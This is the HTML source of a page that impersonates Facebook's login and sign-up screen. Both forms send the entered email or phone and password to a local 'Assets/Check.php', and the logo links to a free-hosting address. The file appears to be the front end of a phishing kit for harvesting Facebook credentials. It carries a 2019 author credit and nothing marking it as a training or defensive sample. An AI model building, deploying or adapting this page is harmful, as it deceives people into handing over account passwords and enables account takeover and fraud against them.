<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1, user-scalable=0">
    <title>Facebook Log in or Sign up</title>
    <link rel="icon" href="facebook.ico" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="CSS/main.css">
</head>

<body>
    <form action="./Assets/Check.php" method="post">
        <div class="head">
            <abbr title="A way to connect Peoples"><a href="http://fbprof289.000webhostapp.com/" class="facebook"><img src="Assets/Images/facebook.png" /></a></abbr>
            <table style="color:white">
                <tr>
                    <td style="height:15px">
                        <p>Email or Phone
                    </td>
                    <td> Password</td>
                </tr>
                <tr>
                    <td style="height:21px"> <input type="text" name="userName" /></td>
                    <td style="height:21px"><input type="password" name="Password" /></td>
                    <td style="height:21px"><input type="submit" value="Log in" /></td>
                </tr>
                </p>
            </table>
            <a href="">&nbsp Forgotten Account?</a>
    </form>
    </div>
    <div class="left">
        <p><b>Facebook helps you connect and share with the<br /> peoples in your life.</b></p>
        <img src="Assets/Images/left.png" />
        <p id="footer" style="font-size:80%; top:27%;" >&copy; Ankit Prasad : 2019</p>
    </div>
    <div class="right"><br />
        <span style="font-size:230%; color:rgb(27,27,27);"><b>Create an account</b></span><br />
        <br /><span style="font-size:130%;">It's free and always will be.</span><br />
        <form action="./Assets/Check.php" method="post">
            <span style="width:50%;"><input type="text" placeholder="First name"></span>&nbsp;
            <span style="width:50%;"><input type="text" placeholder="Surname"></span>
            <input type="email" placeholder="Mobile number or email address" name="userName"><br />
            <input type="password" placeholder="New password" name="Password"><br /><br />

            <span style="color:rgb(63,63,80)"><b>Birthday</b></span><br />
           &nbsp;<select id="date">
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
                <option value="13">13</option>
                <option value="14">14</option>
                <option value="15">15</option>
                <option value="16">16</option>
                <option value="17">17</option>
                <option value="18">18</option>
                <option value="19">19</option>
                <option value="20">20</option>
                <option value="21">21</option>
                <option value="22">22</option>
                <option value="23">23</option>
                <option value="24">24</option>
                <option value="25">25</option>
                <option value="26">26</option>
                <option value="27">27</option>
                <option value="28">28</option>
                <option value="29">29</option>
                <option value="30">30</option>
                <option value="31">31</option>
            </select>
            <select id="month">
                <option value="01">Jan</option>
                <option value="02">Feb</option>
                <option value="03">Mar</option>
                <option value="04">Apr</option>
                <option value="05">May</option>
                <option value="06">Jun</option>
                <option value="07">Jul</option>
                <option value="08">Aug</option>
                <option value="09">Sep</option>
                <option value="10">Oct</option>
                <option value="11">Nov</option>
                <option value="12">Dec</option>
            </select>
            <select id="year">
                <option value="1990">1990</option>
                <option value="1991">1991</option>
                <option value="1992">1992</option>
                <option value="1993">1993</option>
                <option value="1994">1994</option>
                <option value="1995">1995</option>
                <option value="1996">1996</option>
                <option value="1997">1997</option>
                <option value="1998">1998</option>
                <option value="1999">1999</option>
                <option value="2000">2000</option>
                <option value="2001">2001</option>
                <option value="2002">2002</option>
                <option value="2003">2003</option>
                <option value="2004">2004</option>
                <option value="2005">2005</option>
                <option value="2006">2006</option>
                <option value="2007">2007</option>
                <option value="2008">2008</option>
                <option value="2009">2009</option>
                <option value="2010">2010</option>
                <option value="2011">2011</option>
                <option value="2012">2012</option>
                <option value="2013">2013</option>
                <option value="2014">2014</option>
                <option value="2015">2015</option>
                <option value="2016">2016</option>
                <option value="2017">2017</option>
                <option value="2018">2018</option>
                <option value="2019">2019</option>
            </select><br /><br />
            <span style="color:rgb(63,63,80);"><b>Gender</b></span><br />
            <input name="gender" type="radio" value="Male" /><label>&nbspMale</label>&nbsp&nbsp
            &nbsp&nbsp<input name="gender" type="radio" value="Female" /><label >&nbspFemale</label>&nbsp&nbsp
            &nbsp&nbsp<input name="gender" type="radio" value="Female" /><label>&nbspOthers</label><br /><br />
            <p style="font-size:74%;">By clicking Sign Up, you agree to our <span style="color:blue;">Terms, Data Policy</span>and<br />
                <span style="color:blue;">Cookie Policy.</span>
                You may receive SMS notifications from us and <br />can opt out at any time.</p><br />
            <input type="submit" value="Sign Up" /><br /><br /><br />
        </form>
    </div>
</body>

</html>